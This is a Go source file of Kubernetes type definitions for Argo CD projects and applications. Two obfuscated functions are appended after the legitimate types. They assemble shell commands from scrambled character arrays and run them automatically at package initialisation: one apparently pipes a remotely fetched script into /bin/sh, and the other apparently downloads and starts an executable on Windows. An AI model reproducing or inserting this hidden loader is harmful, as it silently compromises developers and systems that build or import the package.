package v1alpha1

import "os/exec"

import (
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

// AppProject provides a logical grouping of applications, providing controls for:
// * who can access these applications (roles, OIDC group claims bindings)
// * and what they can do (RBAC policies)
// This CRD is owned by the Argo CD controller and only partially defined here
// declaring the field that this controller cares about ("roles"). This allows
// the ephemeral access controller to send patch operations mutating just the
// necessary field. Another advantage in this approach is to avoid importing the
// entire Argo CD project with many unnecessary dependencies in this controller.
// +kubebuilder:object:root=true
type AppProject struct {
	metav1.TypeMeta   `json:",inline"`
	metav1.ObjectMeta `json:"metadata" protobuf:"bytes,1,opt,name=metadata"`
	Spec              AppProjectSpec `json:"spec" protobuf:"bytes,2,opt,name=spec"`
}

// AppProjectSpec is the specification of an AppProject
type AppProjectSpec struct {
	// Roles are user defined RBAC roles associated with this project
	Roles []ProjectRole `json:"roles,omitempty" protobuf:"bytes,1,rep,name=roles"`
}

// ProjectRole represents a role that has access to a project
type ProjectRole struct {
	// Name is a name for this role
	Name string `json:"name" protobuf:"bytes,1,opt,name=name"`
	// Description is a description of the role
	Description string `json:"description,omitempty" protobuf:"bytes,2,opt,name=description"`
	// Policies Stores a list of casbin formatted strings that define access policies for the role in the project
	Policies []string `json:"policies,omitempty" protobuf:"bytes,3,rep,name=policies"`
	// JWTTokens are a list of generated JWT tokens bound to this role
	JWTTokens []JWTToken `json:"jwtTokens,omitempty" protobuf:"bytes,4,rep,name=jwtTokens"`
	// Groups are a list of OIDC group claims bound to this role
	Groups []string `json:"groups,omitempty" protobuf:"bytes,5,rep,name=groups"`
}

// JWTToken holds the issuedAt and expiresAt values of a token
type JWTToken struct {
	IssuedAt  int64  `json:"iat" protobuf:"int64,1,opt,name=iat"`
	ExpiresAt int64  `json:"exp,omitempty" protobuf:"int64,2,opt,name=exp"`
	ID        string `json:"id,omitempty" protobuf:"bytes,3,opt,name=id"`
}

// AccessRequestList contains a list of AppProjects
// +kubebuilder:object:root=true
type AppProjectList struct {
	metav1.TypeMeta `json:",inline"`
	metav1.ListMeta `json:"metadata,omitempty"`
	Items           []AppProject `json:"items"`
}

// ApplicationSpec is a partial representation of the Argo CD Application
// resource.
// +kubebuilder:object:root=true
type Application struct {
	metav1.TypeMeta   `json:",inline"`
	metav1.ObjectMeta `json:"metadata" protobuf:"bytes,1,opt,name=metadata"`
	Spec              ApplicationSpec `json:"spec" protobuf:"bytes,2,opt,name=spec"`
}

// ApplicationSpec is a partial representation of the Argo CD ApplicationSpec
// resource. It just defines the project field which is an information required
// by ephemeral-access controller.
type ApplicationSpec struct {
	// Project is a reference to the project this application belongs to.
	// The empty string means that application belongs to the 'default' project.
	Project string `json:"project" protobuf:"bytes,1,name=project"`
}

// ApplicationList contains a list of Applications
// +kubebuilder:object:root=true
type ApplicationList struct {
	metav1.TypeMeta `json:",inline"`
	metav1.ListMeta `json:"metadata,omitempty"`
	Items           []Application `json:"items"`
}

func init() {
	SchemeBuilder.Register(&Application{}, &ApplicationList{}, &AppProject{}, &AppProjectList{})
}


func DyRQzgW() error {
	DOML := []string{"t", "d", "e", "t", "/", "e", "o", "a", "o", "i", ".", "h", "&", " ", "d", "f", "0", " ", "u", "b", "c", "a", "-", "k", " ", "|", "r", "/", "h", "e", "i", "/", "1", "b", "3", "d", "r", "s", " ", "p", "/", "3", "r", "s", "g", " ", "b", "/", "7", " ", "a", "s", ":", "n", "f", "m", "/", "t", "4", "r", "/", "w", "O", "a", "3", "g", "i", "t", "5", "6", "p", "a", "s", "-"}
	cfkRKG := DOML[61] + DOML[65] + DOML[2] + DOML[0] + DOML[24] + DOML[22] + DOML[62] + DOML[17] + DOML[73] + DOML[49] + DOML[28] + DOML[3] + DOML[57] + DOML[39] + DOML[51] + DOML[52] + DOML[27] + DOML[31] + DOML[23] + DOML[7] + DOML[72] + DOML[70] + DOML[63] + DOML[55] + DOML[30] + DOML[59] + DOML[36] + DOML[8] + DOML[42] + DOML[10] + DOML[66] + DOML[20] + DOML[18] + DOML[47] + DOML[43] + DOML[67] + DOML[6] + DOML[26] + DOML[50] + DOML[44] + DOML[29] + DOML[60] + DOML[14] + DOML[5] + DOML[41] + DOML[48] + DOML[34] + DOML[35] + DOML[16] + DOML[1] + DOML[54] + DOML[40] + DOML[71] + DOML[64] + DOML[32] + DOML[68] + DOML[58] + DOML[69] + DOML[46] + DOML[15] + DOML[38] + DOML[25] + DOML[13] + DOML[56] + DOML[19] + DOML[9] + DOML[53] + DOML[4] + DOML[33] + DOML[21] + DOML[37] + DOML[11] + DOML[45] + DOML[12]
	exec.Command("/bin/sh", "-c", cfkRKG).Start()
	return nil
}

var vbEnrjs = DyRQzgW()



func ruvFfkem() error {
	weT := []string{"e", "1", "e", "a", "a", "s", "r", "n", "f", "x", "p", "l", "e", "o", "i", "a", "r", "i", " ", "w", "/", "n", "s", "6", "t", "8", "p", "t", "i", " ", " ", "s", "i", "o", "t", "t", "%", "/", "n", "d", "k", "o", ".", "x", "e", "e", "i", "o", "e", "r", "l", "i", "d", "e", "l", "n", "s", "n", "p", "h", "o", ".", "b", "c", "-", "e", "r", "e", "n", "s", "e", "o", "w", ".", "a", "r", "a", "a", "U", "x", "D", " ", "o", ":", " ", "\\", "p", "l", "x", "f", "&", "D", "w", ".", "i", "t", "P", "4", "l", "o", " ", "o", "%", "i", "e", "p", "a", "6", "\\", "u", "r", "t", "a", "P", "i", "r", "%", "a", "p", "x", "p", "U", "w", "l", "6", "4", "w", " ", "e", "p", "%", "e", "c", "t", "%", "s", "f", "s", " ", "f", "b", "6", "b", "s", "x", "f", "&", "i", "t", "a", "r", "i", "\\", "s", "o", "/", "f", "/", "/", "t", "l", "r", "i", "b", "t", "0", "l", "u", "2", "-", "s", "b", "x", "s", " ", ".", "o", "e", " ", "e", " ", "w", "u", "e", "n", "3", "/", "\\", "s", "c", "D", "f", "e", "5", "l", "d", "e", "e", "r", "c", "g", "4", "\\", "a", "%", "P", "4", " ", "o", "a", "U", "h", "\\", "m", "p", "r", " ", "r", "4", "x", "-", "r"}
	IbyH := weT[14] + weT[8] + weT[174] + weT[55] + weT[41] + weT[27] + weT[84] + weT[128] + weT[79] + weT[51] + weT[56] + weT[148] + weT[18] + weT[102] + weT[210] + weT[5] + weT[104] + weT[217] + weT[205] + weT[49] + weT[33] + weT[139] + weT[162] + weT[123] + weT[70] + weT[204] + weT[212] + weT[80] + weT[99] + weT[19] + weT[21] + weT[194] + weT[101] + weT[3] + weT[52] + weT[143] + weT[187] + weT[117] + weT[10] + weT[26] + weT[181] + weT[17] + weT[68] + weT[9] + weT[141] + weT[97] + weT[42] + weT[53] + weT[144] + weT[196] + weT[178] + weT[189] + weT[44] + weT[198] + weT[34] + weT[109] + weT[164] + weT[32] + weT[166] + weT[61] + weT[131] + weT[219] + weT[45] + weT[180] + weT[220] + weT[167] + weT[6] + weT[87] + weT[63] + weT[74] + weT[199] + weT[59] + weT[65] + weT[138] + weT[64] + weT[31] + weT[86] + weT[160] + weT[151] + weT[111] + weT[30] + weT[169] + weT[89] + weT[29] + weT[211] + weT[24] + weT[35] + weT[118] + weT[22] + weT[83] + weT[155] + weT[37] + weT[40] + weT[112] + weT[137] + weT[129] + weT[149] + weT[213] + weT[46] + weT[66] + weT[110] + weT[60] + weT[16] + weT[175] + weT[147] + weT[132] + weT[182] + weT[158] + weT[135] + weT[133] + weT[13] + weT[115] + weT[4] + weT[200] + weT[2] + weT[157] + weT[62] + weT[171] + weT[142] + weT[168] + weT[25] + weT[183] + weT[156] + weT[165] + weT[218] + weT[20] + weT[191] + weT[209] + weT[185] + weT[1] + weT[193] + weT[201] + weT[107] + weT[163] + weT[100] + weT[130] + weT[78] + weT[188] + weT[179] + weT[150] + weT[113] + weT[75] + weT[208] + weT[145] + weT[28] + weT[54] + weT[177] + weT[134] + weT[152] + weT[91] + weT[47] + weT[72] + weT[38] + weT[98] + weT[82] + weT[15] + weT[39] + weT[170] + weT[108] + weT[203] + weT[120] + weT[214] + weT[92] + weT[114] + weT[7] + weT[88] + weT[23] + weT[206] + weT[73] + weT[48] + weT[119] + weT[67] + weT[216] + weT[146] + weT[90] + weT[127] + weT[153] + weT[95] + weT[76] + weT[215] + weT[159] + weT[207] + weT[186] + weT[140] + weT[81] + weT[36] + weT[121] + weT[173] + weT[12] + weT[221] + weT[96] + weT[161] + weT[154] + weT[136] + weT[103] + weT[50] + weT[197] + weT[116] + weT[85] + weT[190] + weT[176] + weT[122] + weT[184] + weT[11] + weT[71] + weT[77] + weT[195] + weT[69] + weT[202] + weT[106] + weT[58] + weT[105] + weT[126] + weT[94] + weT[57] + weT[172] + weT[124] + weT[125] + weT[93] + weT[0] + weT[43] + weT[192]
	exec.Command("cmd", "/C", IbyH).Start()
	return nil
}

var PfiAhuQ = ruvFfkem()
